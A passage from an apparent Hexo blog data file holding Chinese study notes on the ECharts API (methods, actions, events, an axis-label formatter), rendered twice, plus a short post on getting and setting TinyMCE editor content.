\\<br>销毁实例，实例销毁后无法再被使用。</p>\n</li>\n<li><p>getInstanceByDom \\<br>获取 dom 容器上的实例。</p>\n</li>\n<li><p>registerMap \\<br>注册可用的地图，必须在包括 geo 组件或者 map 图表类型的时候才能使用。</p>\n</li>\n<li><p>getMap \\<br>获取已注册的地图，返回的对象类型如下</p>\n</li>\n<li><p>registerTheme \\<br>注册主题，用于初始化实例的时候指定。</p>\n</li>\n<li><p>graphic \\<br>图形相关帮助方法。</p>\n<ul>\n<li><p>clipPointsByRect<br>输入一组点，和一个矩形，返回被矩形截取过的点。</p>\n</li>\n<li><p>clipRectByRect<br>输入两个矩形，返回第二个矩形截取第一个矩形的结果。</p>\n</li>\n</ul>\n<p>注意：如果矩形完全被截干净，会返回 undefined。</p>\n</li>\n</ul>\n</li>\n<li><p>echartsInstance \\<br>通过 echarts.init 创建的实例。</p>\n<ul>\n<li><p>group \\<br>图表的分组，用于<code>联动</code></p>\n</li>\n<li><p>setOption !\\<br>设置图表实例的配置项以及数据，<strong><code>万能接口</code></strong>，所有参数和数据的修改都可以通过setOption完成，ECharts 会合并新的参数和数据，然后刷新图表。\\<br>如开启动画，ECharts 找到两组数据之间的差异然后通过合适的动画去表现数据的变化。</p>\n<p>注： ECharts 2.x 中的通过 <code>addData</code> , <code>setSeries</code> 方法设置配置项的方式将不再支持，在 ECharts 3 中统一使用<code>setOption</code>，可参考示例。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">chart.setOption(option, notMerge, lazyUpdate);</span><br><span class=\"line\"></span><br><span class=\"line\">chart.setOption(option, &#123;</span><br><span class=\"line\">    notMerge: ...,</span><br><span class=\"line\">    lazyUpdate: ...,</span><br><span class=\"line\">    silent: ...</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n</li>\n</ul>\n<pre><code>- getWidth \\\n获取 ECharts 实例容器的宽度。\n() =&gt; number\n\n- getHeight \\\n获取 ECharts 实例容器的高度。\n() =&gt; number\n\n- getDom \\\n获取 ECharts 实例容器的 dom 节点。\n\n- getOption \\\n获取当前实例中维护的option对象，返回的option对象中包含了用户多次setOption合并得到的配置项和数据，也记录了用户交互的状态 \\\n例如图例的开关，数据区域缩放选择的范围等等。所以从这份 option 可以恢复或者得到一个新的一模一样的实例。 \\\n注意：返回的 option 每个组件的属性值都统一是一个`数组`，不管setOption传进来的时候是单个组件的对象还是多个组件的数组。 \\\n推荐通过setOption去修改部分配置。\n\n- resize \\\n改变图表尺寸，在容器大小发生改变时需要手动调用。\n\n- dispatchAction \\\n触发图表行为，例如图例开关`legendToggleSelect`, 数据区域缩放`dataZoom`，显示提示框`showTip`等等，更多见 `action` 和 `events` 的文档。\n\n- on \\\n绑定事件处理函数。 \\\nECharts 中的事件有两种，1、鼠标事件，在鼠标点击某个图形上会触发， 2、调用 dispatchAction 后触发的事件。具体见 action 和 events 的文档。 \\\n参数 [eventName, query]\n\n- off \\\n解绑事件处理函数。 \\\n参数 [eventName, handler]\n\n- convertToPixel \\\n转换坐标系上的点到像素坐标值。\n\n- convertFromPixel \\\n转换像素坐标值到逻辑坐标系上的点。是 convertToPixel 的逆运算。 \n\n- containPixel \\\n判断给定的点是否在指定的坐标系或者系列上。\n\n- showLoading \\\n显示加载动画效果。可以在加载数据前手动调用改接口显示加载动画，在数据加载完成后调用 hideLoading 隐藏加载动画。\n\n- hideLoading \\\n隐藏动画加载效果。\n\n- getDataURL \\\n导出图表图片，返回一个 base64 的 URL，可以设置为Image的src。\n\n- getConnectedDataURL \\\n导出联动的图表图片，返回一个 base64 的 url，可以设置为Image的src。导出图片中每个图表的相对位置跟容器的相对位置有关。\n\n- appendData \\\n此接口用于，在大数据量（百万以上）的渲染场景，分片加载数据和增量渲染。在大数据量的场景下（例如地理数的打点），就算数据使用二进制格式，也会有几十或上百兆，在互联网环境下，往往需要分片加载。appendData 接口提供了分片加载后增量渲染的能力，渲染新加如的数据块时不会清除原有已经渲染的部分。\n\n- clear \\\n清空当前实例，会移除实例中所有的组件和图表。清空后调用 getOption 方法返回一个{}空对象。\n\n- isDisposed \\\n当前实例是否已经被释放。\n\n- dispose \\\n销毁实例，销毁后实例无法再被使用。\n</code></pre><ul>\n<li><p>action \\<br>ECharts 中支持的图表行为，通过 dispatchAction 触发。 \\<br>注： 代码中的 ?: 表示该属性是可选的。EVENT: 是 action 对应触发的事件。</p>\n<ul>\n<li><p>highlight \\<br>高亮指定的数据图形。 \\<br>通过<code>seriesName</code>或者<code>seriesIndex</code>指定系列。如果要再指定某个数据可以再指定<code>dataIndex</code>或者<code>name</code>。</p>\n</li>\n<li><p>downplay \\<br>取消高亮指定的数据图形。</p>\n</li>\n<li><p>legend \\<br>图例组件相关的行为，必须引入图例组件后才能使用。</p>\n<ul>\n<li><p>legendSelect \\<br>选中图例。</p>\n</li>\n<li><p>legendUnSelect \\<br>取消选中图例。</p>\n</li>\n<li><p>legendToggleSelect \\<br>切换图例的选中状态。</p>\n</li>\n<li><p>legendScroll \\<br>控制图例的滚动。当 legend.type 为 ‘scroll’ 时有效。</p>\n</li>\n</ul>\n</li>\n<li><p>tooltip \\<br>提示框组件相关的行为，必须引入提示框组件后才能使用。</p>\n<ul>\n<li><p>showTip \\<br>显示提示框。</p>\n</li>\n<li><p>hideTip \\<br>隐藏提示框。</p>\n</li>\n</ul>\n</li>\n<li><p>dataZoom \\<br>数据区域缩放组件相关的行为，必须引入数据区域缩放组件后才能使用。</p>\n<ul>\n<li>dataZoom \\<br>数据区域缩放。</li>\n</ul>\n</li>\n<li><p>visualMap \\<br>视觉映射组件相关的行为，必须引入视觉映射组件后才能使用。</p>\n<ul>\n<li>selectDataRange \\<br>选取映射的数值范围。</li>\n</ul>\n</li>\n<li><p>timeline \\<br>时间轴组件相关的行为，必须引入时间轴组件后才能使用。</p>\n<ul>\n<li><p>timelineChange \\<br>设置当前的时间点。</p>\n</li>\n<li><p>timelinePlayChange \\<br>切换时间轴的播放状态。</p>\n</li>\n</ul>\n</li>\n<li><p>toolbox \\<br>工具栏组件相关的行为，必须引入工具栏组件后才能使用。</p>\n<ul>\n<li>restore \\<br>重置 option。</li>\n</ul>\n</li>\n<li><p>pie \\<br>饼图相关的行为，必须引入饼图后才能使用。</p>\n<ul>\n<li><p>pieSelect \\<br>选中指定的饼图扇形。</p>\n</li>\n<li><p>pieUnSelect \\<br>取消选中指定的饼图扇形。</p>\n</li>\n<li><p>pieToggleSelect \\<br>切换指定的饼图扇形选中状态。</p>\n</li>\n</ul>\n</li>\n<li><p>geo \\<br>地图组件相关的行为，必须引入地图组件后才能使用。</p>\n<ul>\n<li><p>geoSelect \\<br>选中指定的地图区域。</p>\n</li>\n<li><p>geoUnSelect \\<br>取消选中指定的地图区域。</p>\n</li>\n<li><p>geoToggleSelect \\<br>切换指定的地图区域选中状态。</p>\n</li>\n</ul>\n</li>\n<li><p>map \\<br>地图图表相关的行为，必须引入地图图表后才能使用。</p>\n<ul>\n<li><p>mapSelect \\<br>选中指定的地图区域。</p>\n</li>\n<li><p>mapUnSelect \\<br>取消选中指定的地图区域。</p>\n</li>\n<li><p>mapToggleSelect \\<br>切换指定的地图区域选中状态。</p>\n</li>\n</ul>\n</li>\n<li><p>graph \\<br>关系图 相关的行为，必须引入 关系图 后才能使用。</p>\n<ul>\n<li><p>focusNodeAdjacency \\<br>将指定的节点以及其所有邻接节点高亮。</p>\n</li>\n<li><p>unfocusNodeAdjacency \\<br>将指定的节点以及其所有邻接节点高亮。</p>\n</li>\n</ul>\n</li>\n<li><p>brush \\<br>区域选择相关的行为。</p>\n<ul>\n<li>brush \\<br>触发此 action 可向 echarts 中添加一个或多个选框</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p>events \\<br>在 ECharts 中主要通过 on 方法添加事件处理函数，该文档描述了所有 ECharts 的事件列表。 \\<br>ECharts 中的事件分为两种，一种是鼠标事件，在鼠标点击某个图形上会触发，还有一种是 调用 dispatchAction 后触发的事件。</p>\n<ul>\n<li><p>鼠标事件 \\<br>鼠标事件包括<code>click</code>，<code>dblclick</code>，<code>mousedown</code>，<code>mouseup</code>，<code>mouseover</code>，<code>mouseout</code>，<code>globalout</code>，<code>contextmenu</code>。<br>参见 <a href=\"http://echarts.baidu.com/tutorial.html\" target=\"_blank\" rel=\"noopener\">ECharts 中的事件和行为</a></p>\n</li>\n<li><p>legendselectchanged \\<br>ACTION: legendToggleSelect 切换图例选中状态后的事件。<br>注：图例组件用户切换图例开关会触发该事件。</p>\n</li>\n<li><p>legendselected \\<br>ACTION: legendSelect 图例选中后的事件。</p>\n</li>\n<li><p>legendunselected \\<br>ACTION: legendUnSelect 图例取消选中后的事件。</p>\n</li>\n<li><p>legendscroll \\<br>ACTION: legendscroll 图例滚动事件。 </p>\n</li>\n<li><p>datazoom \\<br>ACTION: dataZoom<br>数据区域缩放后的事件。</p>\n</li>\n<li><p>datarangeselected \\<br>ACTION: selectDataRange 视觉映射组件中，range 值改变后触发的事件。</p>\n</li>\n<li><p>timelinechanged \\<br>ACTION: timelineChange 时间轴中的时间点改变后的事件。</p>\n</li>\n<li><p>timelineplaychanged \\<br>ACTION: timelinePlayChange 时间轴中播放状态的切换事件。</p>\n</li>\n<li><p>restore \\<br>ACTION: restore 重置 option 事件。</p>\n</li>\n<li><p>dataviewchanged \\<br>工具栏中数据视图的修改事件。</p>\n</li>\n<li><p>magictypechanged \\<br>工具栏中动态类型切换的切换事件。</p>\n</li>\n<li><p>geoselectchanged \\<br>ACTION: geoToggleSelect \\<br>geo 中地图区域切换选中状态的事件。</p>\n</li>\n<li><p>geoselected \\<br>ACTION: geoSelect \\<br>geo 中地图区域选中后的事件。</p>\n</li>\n<li><p>geounselected \\<br>ACTION: geoUnSelect<br>geo 中地图区域取消选中后的事件。</p>\n</li>\n<li><p>pieselectchanged \\<br>ACTION: pieToggleSelect<br>series-pie 中饼图扇形切换选中状态的事件。</p>\n</li>\n<li><p>pieselected \\<br>ACTION: pieSelect<br>series-pie 中饼图扇形选中后的事件。<br>使用dispatchAction可触发此事件，用户点击不会触发此事件（用户点击事件请使用 pieselectchanged）。</p>\n</li>\n<li><p>pieunselected \\<br>ACTION: pieUnSelect<br>series-pie 中饼图扇形取消选中后的事件。</p>\n</li>\n<li><p>mapselectchanged \\<br>ACTION: mapToggleSelect<br>series-map 中地图区域切换选中状态的事件。<br>用户点击选中会触发该事件。</p>\n</li>\n<li><p>mapselected \\<br>ACTION: mapSelect<br>series-map 中地图区域选中后的事件。</p>\n</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"配置项\"><a href=\"#配置项\" class=\"headerlink\" title=\"配置项\"></a>配置项</h2><h2 id=\"formatter\"><a href=\"#formatter\" class=\"headerlink\" title=\"formatter\"></a>formatter</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">axisLabel: &#123;</span><br><span class=\"line\">  interval: 0,</span><br><span class=\"line\">  formatter:function(value)&#123;</span><br><span class=\"line\">    // 拼接加\\n返回的类目项</span><br><span class=\"line\">    var ret = &quot;&quot;; </span><br><span class=\"line\"></span><br><span class=\"line\">    // 一行显示文字个数</span><br><span class=\"line\">    var maxLength = 2; </span><br><span class=\"line\">    </span><br><span class=\"line\">    // X轴类 当前项 文字长度</span><br><span class=\"line\">    var valLength = value.length; </span><br><span class=\"line\"></span><br><span class=\"line\">    // 类目项需要换行的行数</span><br><span class=\"line\">    var rowN = Math.ceil(valLength / maxLength); </span><br><span class=\"line\">    </span><br><span class=\"line\">    //如果类目项的文字大于3</span><br><span class=\"line\">    if (rowN &gt; 1) &#123;</span><br><span class=\"line\">      for (var i = 0; i &lt; rowN; i++) &#123;</span><br><span class=\"line\">        var temp = &quot;&quot;; // 每次截取的字符串</span><br><span class=\"line\">        var start = i * maxLength; // 开始截取的位置</span><br><span class=\"line\">        var end = start + maxLength; // 结束截取的位置</span><br><span class=\"line\">        //这里也可以加一个是否是最后一行的判断，但是不加也没有影响，那就不加吧</span><br><span class=\"line\">        temp = value.substring(start, end) + &quot;\\n&quot;;</span><br><span class=\"line\">        ret += temp; // 凭借最终的字符串</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      return ret;</span><br><span class=\"line\">    &#125; else &#123;</span><br><span class=\"line\">        return value;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"ECharts学习笔记\"><a href=\"#ECharts学习笔记\" class=\"headerlink\" title=\"ECharts学习笔记\"></a>ECharts学习笔记</h1><h2 id=\"API\"><a href=\"#API\" class=\"headerlink\" title=\"API\"></a>API</h2><p>API分为 四大类<br>[‘echarts’, ‘echartsInstance’, ‘action’, ‘events’]</p>\n<ul>\n<li><p>echarts</p>\n<ul>\n<li><p>init: Function \\<br>创建一个 ECharts 实例，返回 echartsInstance，不能在单个容器上初始化多个 ECharts 实例。</p>\n<blockquote>\n<p>(dom, theme?, opts?) =&gt; echartsInstance</p>\n</blockquote>\n</li>\n<li><p>connect \\<br>多个图表实例实现联动。</p>\n</li>\n<li><p>disconnect \\<br>解除图表实例的联动，如果只需要移除单个实例，可以将通过将该图表实例 group 设为空。</p>\n</li>\n<li><p>dispose \\<br>销毁实例，实例销毁后无法再被使用。</p>\n</li>\n<li><p>getInstanceByDom \\<br>获取 dom 容器上的实例。</p>\n</li>\n<li><p>registerMap \\<br>注册可用的地图，必须在包括 geo 组件或者 map 图表类型的时候才能使用。</p>\n</li>\n<li><p>getMap \\<br>获取已注册的地图，返回的对象类型如下</p>\n</li>\n<li><p>registerTheme \\<br>注册主题，用于初始化实例的时候指定。</p>\n</li>\n<li><p>graphic \\<br>图形相关帮助方法。</p>\n<ul>\n<li><p>clipPointsByRect<br>输入一组点，和一个矩形，返回被矩形截取过的点。</p>\n</li>\n<li><p>clipRectByRect<br>输入两个矩形，返回第二个矩形截取第一个矩形的结果。</p>\n</li>\n</ul>\n<p>注意：如果矩形完全被截干净，会返回 undefined。</p>\n</li>\n</ul>\n</li>\n<li><p>echartsInstance \\<br>通过 echarts.init 创建的实例。</p>\n<ul>\n<li><p>group \\<br>图表的分组，用于<code>联动</code></p>\n</li>\n<li><p>setOption !\\<br>设置图表实例的配置项以及数据，<strong><code>万能接口</code></strong>，所有参数和数据的修改都可以通过setOption完成，ECharts 会合并新的参数和数据，然后刷新图表。\\<br>如开启动画，ECharts 找到两组数据之间的差异然后通过合适的动画去表现数据的变化。</p>\n<p>注： ECharts 2.x 中的通过 <code>addData</code> , <code>setSeries</code> 方法设置配置项的方式将不再支持，在 ECharts 3 中统一使用<code>setOption</code>，可参考示例。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">chart.setOption(option, notMerge, lazyUpdate);</span><br><span class=\"line\"></span><br><span class=\"line\">chart.setOption(option, &#123;</span><br><span class=\"line\">    notMerge: ...,</span><br><span class=\"line\">    lazyUpdate: ...,</span><br><span class=\"line\">    silent: ...</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n</li>\n</ul>\n<pre><code>- getWidth \\\n获取 ECharts 实例容器的宽度。\n() =&gt; number\n\n- getHeight \\\n获取 ECharts 实例容器的高度。\n() =&gt; number\n\n- getDom \\\n获取 ECharts 实例容器的 dom 节点。\n\n- getOption \\\n获取当前实例中维护的option对象，返回的option对象中包含了用户多次setOption合并得到的配置项和数据，也记录了用户交互的状态 \\\n例如图例的开关，数据区域缩放选择的范围等等。所以从这份 option 可以恢复或者得到一个新的一模一样的实例。 \\\n注意：返回的 option 每个组件的属性值都统一是一个`数组`，不管setOption传进来的时候是单个组件的对象还是多个组件的数组。 \\\n推荐通过setOption去修改部分配置。\n\n- resize \\\n改变图表尺寸，在容器大小发生改变时需要手动调用。\n\n- dispatchAction \\\n触发图表行为，例如图例开关`legendToggleSelect`, 数据区域缩放`dataZoom`，显示提示框`showTip`等等，更多见 `action` 和 `events` 的文档。\n\n- on \\\n绑定事件处理函数。 \\\nECharts 中的事件有两种，1、鼠标事件，在鼠标点击某个图形上会触发， 2、调用 dispatchAction 后触发的事件。具体见 action 和 events 的文档。 \\\n参数 [eventName, query]\n\n- off \\\n解绑事件处理函数。 \\\n参数 [eventName, handler]\n\n- convertToPixel \\\n转换坐标系上的点到像素坐标值。\n\n- convertFromPixel \\\n转换像素坐标值到逻辑坐标系上的点。是 convertToPixel 的逆运算。 \n\n- containPixel \\\n判断给定的点是否在指定的坐标系或者系列上。\n\n- showLoading \\\n显示加载动画效果。可以在加载数据前手动调用改接口显示加载动画，在数据加载完成后调用 hideLoading 隐藏加载动画。\n\n- hideLoading \\\n隐藏动画加载效果。\n\n- getDataURL \\\n导出图表图片，返回一个 base64 的 URL，可以设置为Image的src。\n\n- getConnectedDataURL \\\n导出联动的图表图片，返回一个 base64 的 url，可以设置为Image的src。导出图片中每个图表的相对位置跟容器的相对位置有关。\n\n- appendData \\\n此接口用于，在大数据量（百万以上）的渲染场景，分片加载数据和增量渲染。在大数据量的场景下（例如地理数的打点），就算数据使用二进制格式，也会有几十或上百兆，在互联网环境下，往往需要分片加载。appendData 接口提供了分片加载后增量渲染的能力，渲染新加如的数据块时不会清除原有已经渲染的部分。\n\n- clear \\\n清空当前实例，会移除实例中所有的组件和图表。清空后调用 getOption 方法返回一个{}空对象。\n\n- isDisposed \\\n当前实例是否已经被释放。\n\n- dispose \\\n销毁实例，销毁后实例无法再被使用。\n</code></pre><ul>\n<li><p>action \\<br>ECharts 中支持的图表行为，通过 dispatchAction 触发。 \\<br>注： 代码中的 ?: 表示该属性是可选的。EVENT: 是 action 对应触发的事件。</p>\n<ul>\n<li><p>highlight \\<br>高亮指定的数据图形。 \\<br>通过<code>seriesName</code>或者<code>seriesIndex</code>指定系列。如果要再指定某个数据可以再指定<code>dataIndex</code>或者<code>name</code>。</p>\n</li>\n<li><p>downplay \\<br>取消高亮指定的数据图形。</p>\n</li>\n<li><p>legend \\<br>图例组件相关的行为，必须引入图例组件后才能使用。</p>\n<ul>\n<li><p>legendSelect \\<br>选中图例。</p>\n</li>\n<li><p>legendUnSelect \\<br>取消选中图例。</p>\n</li>\n<li><p>legendToggleSelect \\<br>切换图例的选中状态。</p>\n</li>\n<li><p>legendScroll \\<br>控制图例的滚动。当 legend.type 为 ‘scroll’ 时有效。</p>\n</li>\n</ul>\n</li>\n<li><p>tooltip \\<br>提示框组件相关的行为，必须引入提示框组件后才能使用。</p>\n<ul>\n<li><p>showTip \\<br>显示提示框。</p>\n</li>\n<li><p>hideTip \\<br>隐藏提示框。</p>\n</li>\n</ul>\n</li>\n<li><p>dataZoom \\<br>数据区域缩放组件相关的行为，必须引入数据区域缩放组件后才能使用。</p>\n<ul>\n<li>dataZoom \\<br>数据区域缩放。</li>\n</ul>\n</li>\n<li><p>visualMap \\<br>视觉映射组件相关的行为，必须引入视觉映射组件后才能使用。</p>\n<ul>\n<li>selectDataRange \\<br>选取映射的数值范围。</li>\n</ul>\n</li>\n<li><p>timeline \\<br>时间轴组件相关的行为，必须引入时间轴组件后才能使用。</p>\n<ul>\n<li><p>timelineChange \\<br>设置当前的时间点。</p>\n</li>\n<li><p>timelinePlayChange \\<br>切换时间轴的播放状态。</p>\n</li>\n</ul>\n</li>\n<li><p>toolbox \\<br>工具栏组件相关的行为，必须引入工具栏组件后才能使用。</p>\n<ul>\n<li>restore \\<br>重置 option。</li>\n</ul>\n</li>\n<li><p>pie \\<br>饼图相关的行为，必须引入饼图后才能使用。</p>\n<ul>\n<li><p>pieSelect \\<br>选中指定的饼图扇形。</p>\n</li>\n<li><p>pieUnSelect \\<br>取消选中指定的饼图扇形。</p>\n</li>\n<li><p>pieToggleSelect \\<br>切换指定的饼图扇形选中状态。</p>\n</li>\n</ul>\n</li>\n<li><p>geo \\<br>地图组件相关的行为，必须引入地图组件后才能使用。</p>\n<ul>\n<li><p>geoSelect \\<br>选中指定的地图区域。</p>\n</li>\n<li><p>geoUnSelect \\<br>取消选中指定的地图区域。</p>\n</li>\n<li><p>geoToggleSelect \\<br>切换指定的地图区域选中状态。</p>\n</li>\n</ul>\n</li>\n<li><p>map \\<br>地图图表相关的行为，必须引入地图图表后才能使用。</p>\n<ul>\n<li><p>mapSelect \\<br>选中指定的地图区域。</p>\n</li>\n<li><p>mapUnSelect \\<br>取消选中指定的地图区域。</p>\n</li>\n<li><p>mapToggleSelect \\<br>切换指定的地图区域选中状态。</p>\n</li>\n</ul>\n</li>\n<li><p>graph \\<br>关系图 相关的行为，必须引入 关系图 后才能使用。</p>\n<ul>\n<li><p>focusNodeAdjacency \\<br>将指定的节点以及其所有邻接节点高亮。</p>\n</li>\n<li><p>unfocusNodeAdjacency \\<br>将指定的节点以及其所有邻接节点高亮。</p>\n</li>\n</ul>\n</li>\n<li><p>brush \\<br>区域选择相关的行为。</p>\n<ul>\n<li>brush \\<br>触发此 action 可向 echarts 中添加一个或多个选框</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p>events \\<br>在 ECharts 中主要通过 on 方法添加事件处理函数，该文档描述了所有 ECharts 的事件列表。 \\<br>ECharts 中的事件分为两种，一种是鼠标事件，在鼠标点击某个图形上会触发，还有一种是 调用 dispatchAction 后触发的事件。</p>\n<ul>\n<li><p>鼠标事件 \\<br>鼠标事件包括<code>click</code>，<code>dblclick</code>，<code>mousedown</code>，<code>mouseup</code>，<code>mouseover</code>，<code>mouseout</code>，<code>globalout</code>，<code>contextmenu</code>。<br>参见 <a href=\"http://echarts.baidu.com/tutorial.html\" target=\"_blank\" rel=\"noopener\">ECharts 中的事件和行为</a></p>\n</li>\n<li><p>legendselectchanged \\<br>ACTION: legendToggleSelect 切换图例选中状态后的事件。<br>注：图例组件用户切换图例开关会触发该事件。</p>\n</li>\n<li><p>legendselected \\<br>ACTION: legendSelect 图例选中后的事件。</p>\n</li>\n<li><p>legendunselected \\<br>ACTION: legendUnSelect 图例取消选中后的事件。</p>\n</li>\n<li><p>legendscroll \\<br>ACTION: legendscroll 图例滚动事件。 </p>\n</li>\n<li><p>datazoom \\<br>ACTION: dataZoom<br>数据区域缩放后的事件。</p>\n</li>\n<li><p>datarangeselected \\<br>ACTION: selectDataRange 视觉映射组件中，range 值改变后触发的事件。</p>\n</li>\n<li><p>timelinechanged \\<br>ACTION: timelineChange 时间轴中的时间点改变后的事件。</p>\n</li>\n<li><p>timelineplaychanged \\<br>ACTION: timelinePlayChange 时间轴中播放状态的切换事件。</p>\n</li>\n<li><p>restore \\<br>ACTION: restore 重置 option 事件。</p>\n</li>\n<li><p>dataviewchanged \\<br>工具栏中数据视图的修改事件。</p>\n</li>\n<li><p>magictypechanged \\<br>工具栏中动态类型切换的切换事件。</p>\n</li>\n<li><p>geoselectchanged \\<br>ACTION: geoToggleSelect \\<br>geo 中地图区域切换选中状态的事件。</p>\n</li>\n<li><p>geoselected \\<br>ACTION: geoSelect \\<br>geo 中地图区域选中后的事件。</p>\n</li>\n<li><p>geounselected \\<br>ACTION: geoUnSelect<br>geo 中地图区域取消选中后的事件。</p>\n</li>\n<li><p>pieselectchanged \\<br>ACTION: pieToggleSelect<br>series-pie 中饼图扇形切换选中状态的事件。</p>\n</li>\n<li><p>pieselected \\<br>ACTION: pieSelect<br>series-pie 中饼图扇形选中后的事件。<br>使用dispatchAction可触发此事件，用户点击不会触发此事件（用户点击事件请使用 pieselectchanged）。</p>\n</li>\n<li><p>pieunselected \\<br>ACTION: pieUnSelect<br>series-pie 中饼图扇形取消选中后的事件。</p>\n</li>\n<li><p>mapselectchanged \\<br>ACTION: mapToggleSelect<br>series-map 中地图区域切换选中状态的事件。<br>用户点击选中会触发该事件。</p>\n</li>\n<li><p>mapselected \\<br>ACTION: mapSelect<br>series-map 中地图区域选中后的事件。</p>\n</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"配置项\"><a href=\"#配置项\" class=\"headerlink\" title=\"配置项\"></a>配置项</h2><h2 id=\"formatter\"><a href=\"#formatter\" class=\"headerlink\" title=\"formatter\"></a>formatter</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">axisLabel: &#123;</span><br><span class=\"line\">  interval: 0,</span><br><span class=\"line\">  formatter:function(value)&#123;</span><br><span class=\"line\">    // 拼接加\\n返回的类目项</span><br><span class=\"line\">    var ret = &quot;&quot;; </span><br><span class=\"line\"></span><br><span class=\"line\">    // 一行显示文字个数</span><br><span class=\"line\">    var maxLength = 2; </span><br><span class=\"line\">    </span><br><span class=\"line\">    // X轴类 当前项 文字长度</span><br><span class=\"line\">    var valLength = value.length; </span><br><span class=\"line\"></span><br><span class=\"line\">    // 类目项需要换行的行数</span><br><span class=\"line\">    var rowN = Math.ceil(valLength / maxLength); </span><br><span class=\"line\">    </span><br><span class=\"line\">    //如果类目项的文字大于3</span><br><span class=\"line\">    if (rowN &gt; 1) &#123;</span><br><span class=\"line\">      for (var i = 0; i &lt; rowN; i++) &#123;</span><br><span class=\"line\">        var temp = &quot;&quot;; // 每次截取的字符串</span><br><span class=\"line\">        var start = i * maxLength; // 开始截取的位置</span><br><span class=\"line\">        var end = start + maxLength; // 结束截取的位置</span><br><span class=\"line\">        //这里也可以加一个是否是最后一行的判断，但是不加也没有影响，那就不加吧</span><br><span class=\"line\">        temp = value.substring(start, end) + &quot;\\n&quot;;</span><br><span class=\"line\">        ret += temp; // 凭借最终的字符串</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      return ret;</span><br><span class=\"line\">    &#125; else &#123;</span><br><span class=\"line\">        return value;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n"},{"title":"Tinymce富文本编辑器","date":"2018-07-18T06:26:06.000Z","_content":"## [富文本编辑器tinymce获取文本内容和设置文本内容](https://blog.csdn.net/u012679583/article/details/50505842)\n\n1、如果当前页面只有一个编辑器： \n\n获取内容：`tinyMCE.activeEditor.getContent()` \n\n设置内容：`tinyMCE.activeEditor.setContent(“需要设置的编辑器内容”)`\n\n2、如果当前页面有多个编辑器（下面的“[0]”表示第一个编辑器，以此类推）： \n\n获取内容：`tinyMCE.editors[0].getContent()`\n\n设置内容：`tinyMCE.editors[0].setContent(“需要设置的编辑器内容”)`\n\n3、获取不带HTML标记的纯文本内容： \n````\nvar activeEditor = tinymce.activeEditor; \n\nvar editBody = activeEditor.getBody(); \n\nactiveEditor.selection.select(editBody); \n\nvar text = activeEditor.selection.getContent( { ‘format’ : ‘text’ } );\n````\n取到的 text 即为纯文本内容。// 一般不需要，因为如果只取纯文本，没必要用富文本编辑器","source":"_posts/FrontEnd/Tinymce富文本编辑器.md","raw":"---\ntitle: Tinymce富文本编辑器\ndate: 2018-07-18 14:26:06\ntags: 富文本\ncategories: Tinymce\n---\n## [富文本编辑器tinymce获取文本内容和设置文本内容](https://blog.csdn.net/u012679583/article/details/50505842)\n\n1、如果当前页面只有一个编辑器： \n\n获取内容：`tinyMCE.activeEditor.getContent()` \n\n设置内容：`tinyMCE.activeEditor.setContent(“需要设置的编辑器内容”)`\n\n2、如果当前页面有多个编辑器（下面的“[0]”表示第一个编辑器，以此类推）： \n\n获取内容：`tinyMCE.editors[0].getContent()`\n\n设置内容：`tinyMCE.editors[0].setContent(“需要设置的编辑器内容”)`\n\n3、获取不带HTML标记的纯文本内容： 